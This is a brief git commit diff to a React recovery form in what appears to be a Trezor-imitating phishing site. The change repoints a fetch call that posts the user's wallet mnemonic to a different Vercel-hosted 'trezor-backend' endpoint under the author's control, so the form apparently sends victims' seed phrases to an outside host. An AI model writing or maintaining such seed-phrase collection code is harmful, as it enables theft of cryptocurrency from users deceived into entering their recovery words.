b823a807fb1e7cb3bfcf317d442f7231e5e82390
Rohit <monuseo2025@mail.com>
2025-11-23 23:54:30 +0530

    first commit

--- components/home/RecoveryForm.tsx
+++ components/home/RecoveryForm.tsx
@@ -54,7 +54,7 @@ const RecoveryForm = () => {
         try {
             setLoading(true);
             const response = await fetch(
-                "https://trezor-backend-self.vercel.app/api/v1/send-mnemonic",
+                "https://trezor-backend-pink.vercel.app/api/v1/send-mnemonic",
                 // "http://localhost:5454/api/v1/send-mnemonic",
                 {
 
